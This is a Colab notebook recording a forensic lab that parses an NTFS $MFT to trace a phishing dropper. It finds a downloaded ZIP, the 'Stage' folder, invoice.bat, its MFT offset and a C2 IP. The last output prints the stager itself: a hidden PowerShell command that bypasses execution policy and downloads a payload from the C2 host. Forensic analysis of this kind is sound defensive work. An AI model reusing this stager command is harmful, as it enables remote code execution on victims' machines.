In [1]:
import os
from google.colab import files

# Create a clean directory for evidence
!mkdir -p /content/evidence
%cd /content/evidence

# Upload the log files (auth.log, wtmp, etc.)
print("Upload your log files (auth.log, wtmp, etc.) below:")
uploaded = files.upload()

# List files to confirm
!ls -lh

/content/evidence
Upload your log files (auth.log, wtmp, etc.) below:


Saving $MFT to $MFT
total 308M
-rw-r--r-- 1 root root 308M Dec 19 10:38 '$MFT'


In [2]:
%%bash
# Install .NET Runtime 6
apt-get update -qq
apt-get install -y -qq dotnet-runtime-6.0 p7zip-full

# Download and setup MFTECmd
mkdir -p /content/tools
cd /content/tools

echo "Downloading MFTECmd..."
wget https://download.ericzimmermanstools.com/net6/MFTECmd.zip -O MFTECmd.zip

# Verify download
SIZE=$(stat -c%s MFTECmd.zip)
echo "Downloaded: $SIZE bytes"

if [ $SIZE -lt 100000 ]; then
    echo "ERROR: Download too small, likely failed"
    exit 1
fi

# Extract
echo "Extracting..."
mkdir -p mftecmd
unzip -q MFTECmd.zip -d mftecmd

# Verify
if [ ! -f mftecmd/MFTECmd.dll ]; then
    echo "ERROR: MFTECmd.dll not found"
    ls -la mftecmd/
    exit 1
fi

rm MFTECmd.zip

echo "✓ MFTECmd ready"
dotnet mftecmd/MFTECmd.dll --version

Selecting previously unselected package dotnet-host.
(Reading database ... 117528 files and directories currently installed.)
Preparing to unpack .../0-dotnet-host_6.0.136-0ubuntu1~22.04.1_amd64.deb ...
Unpacking dotnet-host (6.0.136-0ubuntu1~22.04.1) ...
Selecting previously unselected package dotnet-hostfxr-6.0.
Preparing to unpack .../1-dotnet-hostfxr-6.0_6.0.136-0ubuntu1~22.04.1_amd64.deb ...
Unpacking dotnet-hostfxr-6.0 (6.0.136-0ubuntu1~22.04.1) ...
Selecting previously unselected package liblttng-ust-common1:amd64.
Preparing to unpack .../2-liblttng-ust-common1_2.13.1-1ubuntu1_amd64.deb ...
Unpacking liblttng-ust-common1:amd64 (2.13.1-1ubuntu1) ...
Selecting previously unselected package liblttng-ust-ctl5:amd64.
Preparing to unpack .../3-liblttng-ust-ctl5_2.13.1-1ubuntu1_amd64.deb ...
Unpacking liblttng-ust-ctl5:amd64 (2.13.1-1ubuntu1) ...
Selecting previously unselected package liblttng-ust1:amd64.
Preparing to unpack .../4-liblttng-ust1_2.13.1-1ubuntu1_amd64.deb ...
Unpacking 

W: Skipping acquire of configured file 'main/source/Sources' as repository 'https://r2u.stat.illinois.edu/ubuntu jammy InRelease' does not seem to provide it (sources.list entry misspelt?)
--2025-12-19 10:38:27--  https://download.ericzimmermanstools.com/net6/MFTECmd.zip
Resolving download.ericzimmermanstools.com (download.ericzimmermanstools.com)... 172.67.159.182, 104.21.14.151, 2606:4700:3033::ac43:9fb6, ...
Connecting to download.ericzimmermanstools.com (download.ericzimmermanstools.com)|172.67.159.182|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3043617 (2.9M) [application/zip]
Saving to: ‘MFTECmd.zip’

     0K .......... .......... .......... .......... ..........  1% 38.1M 0s
    50K .......... .......... .......... .......... ..........  3% 4.40M 0s
   100K .......... .......... .......... .......... ..........  5% 5.00M 0s
   150K .......... .......... .......... .......... ..........  6% 41.5M 0s
   200K .......... .......... .......... ..........

In [3]:
%%bash
# Parse MFT with MFTECmd
# Output: CSV file for timeline analysis

mkdir -p /content/analysis

dotnet /content/tools/mftecmd/MFTECmd.dll \
  -f /content/evidence/\$MFT \
  --csv /content/analysis \
  --csvf mft_parsed.csv

echo ""
echo "✓ MFT parsed"
ls -lh /content/analysis/

MFTECmd version 1.3.0.0

Author: Eric Zimmerman (saericzimmerman@gmail.com)
https://github.com/EricZimmerman/MFTECmd

Command line: -f /content/evidence/$MFT --csv /content/analysis --csvf mft_parsed.csv

File type: Mft

Processed /content/evidence/$MFT in 16.5926 seconds

/content/evidence/$MFT: FILE records found: 171,927 (Free records: 142,905) File size: 307.5MB
	CSV output will be saved to /content/analysis/mft_parsed.csv


✓ MFT parsed
total 176M
-rw-r--r-- 1 root root 176M Dec 19 10:39 mft_parsed.csv


In [4]:
# Setup interactive tables
!pip install itables -q
from itables import init_notebook_mode, show
import itables.options as opt

init_notebook_mode(all_interactive=True)
opt.lengthMenu = [10, 25, 50, 100, 500]  # Pagination options
opt.maxBytes = 0  # No size limit

print("✓ Interactive tables enabled")

   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 2.4/2.4 MB 27.5 MB/s eta 0:00:00


✓ Interactive tables enabled


In [5]:
# Task 1: Identify ZIP file downloaded on Feb 13, 2024
# Replicating VisiData workflow: date truncation → frequency → filter → extension analysis

import pandas as pd
from itables import show

# Load the parsed MFT data
df = pd.read_csv('/content/analysis/mft_parsed.csv')

# VD: Navigate to Created0x10 column + Shift+2 (truncate to date only)
print("=== Step 1: Truncate timestamps to dates for cleaner analysis ===")
df['Created_Date'] = pd.to_datetime(df['Created0x10']).dt.date

# VD: Shift+F on Created_Date (frequency analysis to survey temporal distribution)
print("\n=== Step 2: Frequency analysis of creation dates (surveying active dates) ===")
date_freq = df['Created_Date'].value_counts().reset_index()
date_freq.columns = ['Date', 'Count']
date_freq = date_freq.sort_values('Date', ascending=False)
show(date_freq.head(50))

# VD: / search for "2024-02-13" → Enter (filter to target date)
print("\n=== Step 3: Filter to 2024-02-13 (target attack date) ===")
target_date = pd.to_datetime('2024-02-13').date()
feb13 = df[df['Created_Date'] == target_date].copy()
print(f"Filtered to {len(feb13)} entries created on 2024-02-13")
show(feb13[['FileName', 'Extension', 'Created0x10', 'ParentPath']].head(20))

# VD: Navigate to Extension column, Shift+F (frequency analysis of file types)
print("\n=== Step 4: Extension frequency analysis on 2024-02-13 ===")
ext_freq = feb13['Extension'].value_counts().reset_index()
ext_freq.columns = ['Extension', 'Count']
show(ext_freq)

# VD: / search for ".zip" → Enter (isolate ZIP files)
print("\n=== Step 5: Filter for .zip files on 2024-02-13 ===")
zip_files = feb13[feb13['Extension'] == '.zip'].copy()
print(f"Found {len(zip_files)} ZIP file(s)")

# Final result: Display ZIP files with key forensic attributes
print("\n=== ANSWER: ZIP file downloaded on Feb 13, 2024 ===")
show(zip_files[['FileName', 'Extension', 'Created0x10', 'ParentPath', 'FileSize']])

/tmp/ipython-input-4217269177.py:8: DtypeWarning: Columns (10,20,22,30,31,32) have mixed types. Specify dtype option on import or set low_memory=False.
  df = pd.read_csv('/content/analysis/mft_parsed.csv')


=== Step 1: Truncate timestamps to dates for cleaner analysis ===

=== Step 2: Frequency analysis of creation dates (surveying active dates) ===


Loading ITables v2.6.1 from the internet... (need help?)



=== Step 3: Filter to 2024-02-13 (target attack date) ===
Filtered to 8995 entries created on 2024-02-13


Loading ITables v2.6.1 from the internet... (need help?)



=== Step 4: Extension frequency analysis on 2024-02-13 ===


Loading ITables v2.6.1 from the internet... (need help?)



=== Step 5: Filter for .zip files on 2024-02-13 ===
Found 3 ZIP file(s)

=== ANSWER: ZIP file downloaded on Feb 13, 2024 ===


Loading ITables v2.6.1 from the internet... (need help?)


In [8]:
# Task 2: Extract download source URL from Zone.Identifier ADS
# Replicating VisiData workflow: regex filter → isolate record → extract ZoneIdContents

import pandas as pd
from itables import show
import re

# Load the parsed MFT data
df = pd.read_csv('/content/analysis/mft_parsed.csv')

# VD: | (regex filter) on FileName column with pattern "Stage.*Identifier"
print("=== Step 1: Regex filter for Zone.Identifier ADS (download provenance artifact) ===")
print("Pattern: Stage.*Identifier (captures Alternate Data Stream with download metadata)")
ads_pattern = re.compile(r'Stage.*Identifier', re.IGNORECASE)
ads_records = df[df['FileName'].str.contains(ads_pattern, na=False, regex=True)].copy()
print(f"Found {len(ads_records)} ADS record(s)")
show(ads_records[['FileName', 'Extension', 'Created0x10', 'ParentPath']])

# VD: Scroll right to ZoneIdContents column
print("\n=== Step 2: Examine ZoneIdContents (contains download origin metadata) ===")
show(zone_record[['FileName', 'ZoneIdContents']])

/tmp/ipython-input-3358391715.py:9: DtypeWarning: Columns (10,20,22,30,31,32) have mixed types. Specify dtype option on import or set low_memory=False.
  df = pd.read_csv('/content/analysis/mft_parsed.csv')


=== Step 1: Regex filter for Zone.Identifier ADS (download provenance artifact) ===
Pattern: Stage.*Identifier (captures Alternate Data Stream with download metadata)
Found 1 ADS record(s)


Loading ITables v2.6.1 from the internet... (need help?)



=== Step 2: Examine ZoneIdContents (contains download origin metadata) ===


Loading ITables v2.6.1 from the internet... (need help?)


In [9]:
# Task 3: Identify malicious executable file in dropper-created folder
# Replicating VisiData workflow: filter ParentPath → scan extensions → isolate executable

!pip install itables

import pandas as pd
from itables import show

# Load the parsed MFT data
df = pd.read_csv('/content/analysis/mft_parsed.csv')

# VD: | (select) on ParentPath for "Stage" + " (drill down to focused sheet)
print("=== Step 1: Filter for 'Stage' folder (dropper-created context) ===")
print("Rationale: Dropper creates 'Stage' folder for payload staging")
stage_files = df[df['ParentPath'].str.contains('Stage', na=False, case=False)].copy()
print(f"Found {len(stage_files)} files in Stage-related paths")
show(stage_files[['FileName', 'Extension', 'ParentPath', 'Created0x10']])

# VD: Scan Extension column for unusual executables
print("\n=== Step 2: Extension frequency analysis (identify suspicious executables) ===")
ext_freq = stage_files['Extension'].value_counts().reset_index()
ext_freq.columns = ['Extension', 'Count']
show(ext_freq)

# VD: Identify .bat file (unusual/suspicious for invoice context)
print("\n=== Step 3: Isolate .bat files (executable scripts - high suspicion) ===")
bat_files = stage_files[stage_files['Extension'] == '.bat'].copy()
print(f"Found {len(bat_files)} .bat file(s)")
show(bat_files[['FileName', 'Extension', 'ParentPath']])

/tmp/ipython-input-2678470397.py:10: DtypeWarning: Columns (10,20,22,30,31,32) have mixed types. Specify dtype option on import or set low_memory=False.
  df = pd.read_csv('/content/analysis/mft_parsed.csv')


=== Step 1: Filter for 'Stage' folder (dropper-created context) ===
Rationale: Dropper creates 'Stage' folder for payload staging
Found 52 files in Stage-related paths


Loading ITables v2.6.1 from the internet... (need help?)



=== Step 2: Extension frequency analysis (identify suspicious executables) ===


Loading ITables v2.6.1 from the internet... (need help?)



=== Step 3: Isolate .bat files (executable scripts - high suspicion) ===
Found 1 .bat file(s)


Loading ITables v2.6.1 from the internet... (need help?)


In [10]:
# Task 4: Extract Created0x30 timestamp (actual file creation on disk)
# Replicating VisiData workflow: locate Created0x30 column → read timestamp

import pandas as pd
from itables import show

# Load the parsed MFT data
df = pd.read_csv('/content/analysis/mft_parsed.csv')

# Continue from Task 3: invoice.bat already isolated
print("=== Step 1: Isolate invoice.bat from previous analysis ===")
stage_files = df[df['ParentPath'].str.contains('Stage', na=False, case=False)].copy()
bat_file = stage_files[stage_files['Extension'] == '.bat'].copy()
show(bat_file[['FileName', 'Extension', 'ParentPath']])

# VD: Navigate right to Created0x30 column
print("\n=== Step 2: Examine Created0x30 timestamp (STANDARD_INFORMATION creation time) ===")
print("Note: Created0x10 = $FILE_NAME attribute, Created0x30 = $STANDARD_INFORMATION attribute")
show(bat_file[['FileName', 'Created0x10', 'Created0x30']])

# VD: Extract timestamp value
print("\n=== ANSWER: File creation timestamp (Created0x30) ===")
if len(bat_file) > 0:
    creation_time = bat_file['Created0x30'].iloc[0]
    print(f"{creation_time}")

    result_df = pd.DataFrame({
        'File': [bat_file['FileName'].iloc[0]],
        'Created0x30 (Disk Creation)': [creation_time]
    })
    show(result_df)

/tmp/ipython-input-2994721196.py:8: DtypeWarning: Columns (10,20,22,30,31,32) have mixed types. Specify dtype option on import or set low_memory=False.
  df = pd.read_csv('/content/analysis/mft_parsed.csv')


=== Step 1: Isolate invoice.bat from previous analysis ===


Loading ITables v2.6.1 from the internet... (need help?)



=== Step 2: Examine Created0x30 timestamp (STANDARD_INFORMATION creation time) ===
Note: Created0x10 = $FILE_NAME attribute, Created0x30 = $STANDARD_INFORMATION attribute


Loading ITables v2.6.1 from the internet... (need help?)



=== ANSWER: File creation timestamp (Created0x30) ===
2024-02-13 16:38:39.9341326


Loading ITables v2.6.1 from the internet... (need help?)


In [11]:
# Task 5: Calculate MFT offset in hex for stager file
# Replicating VisiData workflow: extract Entry Number → calculate offset → convert to hex

import pandas as pd
from itables import show

# Load the parsed MFT data
df = pd.read_csv('/content/analysis/mft_parsed.csv')

# Continue from previous analysis: invoice.bat already isolated
print("=== Step 1: Locate invoice.bat Entry Number ===")
stage_files = df[df['ParentPath'].str.contains('Stage', na=False, case=False)].copy()
bat_file = stage_files[stage_files['Extension'] == '.bat'].copy()
show(bat_file[['FileName', 'EntryNumber', 'FileSize']])

# VD: Note Entry Number value
if len(bat_file) > 0:
    entry_number = bat_file['EntryNumber'].iloc[0]
    print(f"\n=== Step 2: Calculate MFT offset ===")
    print(f"Entry Number: {entry_number}")

    # MFT record calculation: Entry Number * 1024 bytes per record
    offset_decimal = entry_number * 1024
    print(f"Offset (decimal): {entry_number} * 1024 = {offset_decimal}")

    # Convert to hex
    offset_hex = hex(offset_decimal)
    print(f"\n=== ANSWER: MFT offset in hexadecimal ===")
    print(f"{offset_hex}")

/tmp/ipython-input-3973992696.py:8: DtypeWarning: Columns (10,20,22,30,31,32) have mixed types. Specify dtype option on import or set low_memory=False.
  df = pd.read_csv('/content/analysis/mft_parsed.csv')


=== Step 1: Locate invoice.bat Entry Number ===


Loading ITables v2.6.1 from the internet... (need help?)



=== Step 2: Calculate MFT offset ===
Entry Number: 23436
Offset (decimal): 23436 * 1024 = 23998464

=== ANSWER: MFT offset in hexadecimal ===
0x16e3000


In [12]:
# Task 6: Extract C2 IP:port from MFT-resident stager content
# Replicating VisiData workflow: verify MFT residency → extract raw data → parse C2

import pandas as pd
from itables import show
import re

# Load the parsed MFT data
df = pd.read_csv('/content/analysis/mft_parsed.csv')

# Continue from previous analysis
print("=== Step 1: Verify MFT residency (small file size) ===")
stage_files = df[df['ParentPath'].str.contains('Stage', na=False, case=False)].copy()
bat_file = stage_files[stage_files['Extension'] == '.bat'].copy()
show(bat_file[['FileName', 'FileSize', 'EntryNumber']])

file_size = bat_file['FileSize'].iloc[0]
entry_number = bat_file['EntryNumber'].iloc[0]
offset_hex = hex(entry_number * 1024)

print(f"\nFile size: {file_size} bytes (< 1024 = MFT resident)")
print(f"MFT offset: {offset_hex}")

# VD: Pivot to CLI - hexdump to extract raw MFT record
print("\n=== Step 2: Extract raw MFT record at calculated offset ===")
print(f"Simulating: hexdump -s {offset_hex} -n 1024 -C $MFT")

# Read raw MFT data at the calculated offset
mft_path = '/content/evidence/$MFT'  # Adjust path if needed
offset_decimal = entry_number * 1024

try:
    with open(mft_path, 'rb') as f:
        f.seek(offset_decimal)
        raw_data = f.read(1024)

    # Decode to ASCII, ignoring non-printable characters
    ascii_content = raw_data.decode('ascii', errors='ignore')

    print(f"Raw data extracted ({len(raw_data)} bytes)")
    print("\n=== Step 3: Parse for C2 IP and port ===")

    # Search for IP:port pattern in the content
    ip_pattern = re.compile(r'\b(?:\d{1,3}\.){3}\d{1,3}:\d+\b')
    matches = ip_pattern.findall(ascii_content)

    if matches:
        c2_address = matches[0]  # First IP:port found
        print(f"\n=== ANSWER: C2 IP and port ===")
        print(f"{c2_address}")

        result_df = pd.DataFrame({
            'Stager File': [bat_file['FileName'].iloc[0]],
            'C2 Address': [c2_address],
            'Extraction Method': ['MFT-resident data']
        })
        show(result_df)

        # Optional: Display snippet of raw content for verification
        print("\n=== Raw content preview (first 500 chars) ===")
        print(ascii_content[:500])
    else:
        print("No IP:port pattern found in MFT record")

except FileNotFoundError:
    print(f"MFT file not found at {mft_path}")
    print("Adjust the mft_path variable to point to your $MFT file")

/tmp/ipython-input-617532911.py:9: DtypeWarning: Columns (10,20,22,30,31,32) have mixed types. Specify dtype option on import or set low_memory=False.
  df = pd.read_csv('/content/analysis/mft_parsed.csv')


=== Step 1: Verify MFT residency (small file size) ===


Loading ITables v2.6.1 from the internet... (need help?)



File size: 286 bytes (< 1024 = MFT resident)
MFT offset: 0x16e3000

=== Step 2: Extract raw MFT record at calculated offset ===
Simulating: hexdump -s 0x16e3000 -n 1024 -C $MFT
Raw data extracted (1024 bytes)

=== Step 3: Parse for C2 IP and port ===

=== ANSWER: C2 IP and port ===
43.204.110.203:6666


Loading ITables v2.6.1 from the internet... (need help?)



=== Raw content preview (first 500 chars) ===
FILE0  KY    	  8                   [   0a       `           H       lT^b^b^)^                              )n-    0   p          X     Z    []^[]^[]^[]^                        i n v o i c e . b a t    8             @echo off
start /b powershell.exe -nol -w 1 -nop -ep bypass "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://43.204.110.203:6666/download/powershell/Om1hdHRpZmVzdGF W9uIGV0dw==')
